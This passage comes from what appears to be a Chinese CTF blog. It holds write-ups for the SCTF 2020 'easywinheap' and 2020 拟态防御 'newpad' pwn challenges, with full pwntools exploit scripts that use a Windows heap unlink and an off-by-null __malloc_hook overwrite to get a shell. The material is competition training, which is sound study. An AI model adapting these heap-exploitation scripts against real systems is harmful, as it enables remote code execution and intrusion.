unlink攻击详细可以学习AngelBoy师傅的总结</p><p>第三步：找到system函数：在linux下我们会尝试寻找一个函数（通常就是puts）的got表，然后将其plt的值打印出来找到libc基址，通过这个基址找到system函数。只不过windows下叫做IAT表。</p><p>那么在windows上我们需要怎么做呢：首先通过泄露puts函数地址找到程序基址，之后再写入puts函数对应IAT表的地址，打印出puts函数的真实地址，这样就能找到ucrtbase.dll基址（等于libc基址）</p><div style="width:80%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/12/21/sctf-2020-easywinheap/9.png"></div><p>第四步：最后写入system函数地址和cmd字符串，调用show功能即可调用system函数执行system(“cmd”)拿shell了。</p><h1 id="0x05-调试"><a href="#0x05-调试" class="headerlink" title="0x05 调试"></a>0x05 调试</h1><p>首先看看函数指针写入heap中：</p><div style="width:80%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/12/21/sctf-2020-easywinheap/10.png"></div>蓝色的位置是heap地址，红色的为puts函数地址（异或之后的值）<div style="width:80%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/12/21/sctf-2020-easywinheap/11.png"></div>32位和之前资料上的heap结构偏移有点区别，但是很清晰的是fd和bk指向的是heap地址<p>用unlink攻击成功，我们看到heap list中的heap地址是heap list地址</p><div style="width:80%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/12/21/sctf-2020-easywinheap/12.png"></div><p>后面就按部就班的操作即可<br>再放一张拿win10 shell的图</p><div style="width:80%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/12/21/sctf-2020-easywinheap/13.png"></div><h1 id="0x06-exp"><a href="#0x06-exp" class="headerlink" title="0x06 exp"></a>0x06 exp</h1><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>debug <span class="token operator">=</span> <span class="token number">1</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'split'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>se      <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span>sa      <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span>sl      <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>data<span class="token punctuation">)</span>sla     <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span>sea     <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span>rc      <span class="token operator">=</span> <span class="token keyword">lambda</span> numb<span class="token operator">=</span><span class="token number">4096</span>          <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token punctuation">)</span>rl      <span class="token operator">=</span> <span class="token keyword">lambda</span>                    <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>ru      <span class="token operator">=</span> <span class="token keyword">lambda</span> delims             <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>delims<span class="token punctuation">)</span>uu32    <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>uu64    <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>itv     <span class="token operator">=</span> <span class="token keyword">lambda</span>                    <span class="token punctuation">:</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"192.168.241.134"</span><span class="token punctuation">,</span><span class="token number">8888</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"124.70.197.50"</span><span class="token punctuation">,</span><span class="token number">9010</span><span class="token punctuation">)</span>    elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./student_manager"</span><span class="token punctuation">)</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc-2.27.so"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">"option >\r\n"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">"size >\r\n"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">"option >\r\n"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">"index >\r\n"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">"option >\r\n"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">"index >\r\n"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">"option >\r\n"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">"index >\r\n"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    sa<span class="token punctuation">(</span><span class="token string">"content  >\r\n"</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># step 1</span>create<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>heap_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvn<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>success<span class="token punctuation">(</span><span class="token string">"heap addr ==> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>heap_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># step 2</span>block <span class="token operator">=</span> heap_addr <span class="token operator">-</span> <span class="token number">0x100</span>block_1 <span class="token operator">=</span> block <span class="token operator">+</span> <span class="token number">0xc</span>fd <span class="token operator">=</span> block_1 <span class="token operator">-</span> <span class="token number">4</span>bk <span class="token operator">=</span> block_1payload <span class="token operator">=</span> p32<span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>bk<span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>payload<span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># step 3</span>payload <span class="token operator">=</span> p32<span class="token punctuation">(</span>block<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\n"</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>image_base <span class="token operator">=</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvn<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x1049</span>success<span class="token punctuation">(</span><span class="token string">"image base ==> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>image_base<span class="token punctuation">)</span><span class="token punctuation">)</span>puts_IAT <span class="token operator">=</span> image_base <span class="token operator">+</span> <span class="token number">0x20c4</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>p32<span class="token punctuation">(</span>image_base<span class="token operator">+</span><span class="token number">0x1049</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>puts_IAT<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>raw_input<span class="token punctuation">(</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvn<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0xb9620</span>success<span class="token punctuation">(</span><span class="token string">"libc addr ==> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>system_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0xf0dc0</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>heap_addr<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"cmd.exe\x00\n"</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Windows Pwn从入门到出门 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> win10Heap unlink </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020-拟态防御PWN解题</title>
      <link href="/2020/12/09/2020-ni-tai-fang-yu-pwn-jie-ti/"/>
      <url>/2020/12/09/2020-ni-tai-fang-yu-pwn-jie-ti/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>很早的比赛，做一个总结。凭借着师傅们的努力最终登顶！</p><p>newpad：off by null<br>easy_stack：格式化字符串+栈溢出<br>rbsystem：负数溢出+利用fopen和fread函数分配的堆来leak libc<br>goodnote：整数溢出<br>Emmmm：master of UAF<br>advance_stack: 可以通过劫持got，改后两位为某个字节，令call got的时候是执行syscall。之前见过这种题，当时做题忽视了很多东西，一个是got表可写。最后利用csu来call一下我们修改的got表即可，注意提前布置好参数，用read来读取0x3b个字节，令rax为system的系统调用号</p><h1 id="newpad"><a href="#newpad" class="headerlink" title="newpad"></a>newpad</h1><p>off by null漏洞，前面还有一个bss段中的溢出</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>r <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">:</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>rl <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>ru <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">)</span>rn <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvn<span class="token punctuation">(</span>x<span class="token punctuation">)</span>rud <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">,</span>drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>s <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">:</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>sl <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>sla <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">,</span>y<span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>sa <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">,</span>y<span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>context<span class="token punctuation">.</span>update<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token string">'DEBUG'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'split'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">1</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./newpad'</span><span class="token punctuation">)</span>libc_offset <span class="token operator">=</span> <span class="token number">0x3c4b20</span>gadgets <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x45216</span><span class="token punctuation">,</span><span class="token number">0x4526a</span><span class="token punctuation">,</span><span class="token number">0xf02a4</span><span class="token punctuation">,</span><span class="token number">0xf1147</span><span class="token punctuation">]</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./newpad'</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./x64_libc.so.6'</span><span class="token punctuation">)</span>    p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'f.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">20173</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">'a\n'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'(CMD)>>> '</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'A'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"(SIZE)>>> "</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"(CONTENT)>>> "</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Show</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'(CMD)>>> '</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'F'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"(INDEX)>>> "</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Delete</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'(CMD)>>> '</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'D'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"(INDEX)>>> "</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Edit</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>content<span class="token punctuation">,</span>is_ok<span class="token operator">=</span><span class="token string">'y'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'(CMD)>>> '</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'E'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"(INDEX)>>> "</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"(CONTENT)>>> "</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"(Y/n)>>> "</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>is_ok<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#leak libc</span>    Add<span class="token punctuation">(</span><span class="token number">0xf8</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#1</span>    Add<span class="token punctuation">(</span><span class="token number">0x58</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#2</span>    Add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#3</span>    Add<span class="token punctuation">(</span><span class="token number">0xf8</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#4</span>    Delete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>    Add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x68</span><span class="token operator">+</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#3</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        Edit<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x67</span><span class="token operator">-</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'\n'</span><span class="token punctuation">)</span>    Edit<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x60</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x70</span><span class="token operator">+</span><span class="token number">0x60</span><span class="token operator">+</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'\n'</span><span class="token punctuation">)</span>    Delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    Add<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#1</span>    Delete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>    Delete<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>    Add<span class="token punctuation">(</span><span class="token number">0xf8</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#3</span>    Show<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">" # CONTENT: "</span><span class="token punctuation">)</span>    libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvn<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">0x10</span> <span class="token operator">-</span> <span class="token number">88</span>    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"libc base => "</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>    libc<span class="token punctuation">.</span>address <span class="token operator">=</span> libc_base    fake_chunk <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">0x23</span>    Add<span class="token punctuation">(</span><span class="token number">0x1c0</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x50</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>fake_chunk<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#4</span>    Delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    Delete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>    Add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>    shell_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> gadgets<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>    Add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">0x13</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>shell_addr<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'\n'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> hex<span class="token punctuation">(</span>shell_addr<span class="token punctuation">)</span>    Delete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>exp<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="rbsystem"><a href="#rbsystem" class="headerlink" title="rbsystem"></a>rbsystem</h1><h2 id="查看文件"><a href="#查看文件" class="headerlink" title="查看文件"></a>查看文件</h2><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="en-resource://database/9813:1" alt="81de42f08fe70e452c8f2f585ac1c092.png"></p><h2 id="IDA分析"><a href="#IDA分析" class="headerlink" title="IDA分析"></a>IDA分析</h2><p>标准的菜单题：<br>create：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="en-resource://database/9814:1" alt="aeadae433cbd079295b56fc2e6cc7284.png"></p><p>edit：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="en-resource://database/9809:1" alt="680d7f78256e9542fb757bb899d5c67e.png"></p><p>漏洞位置：<br><img 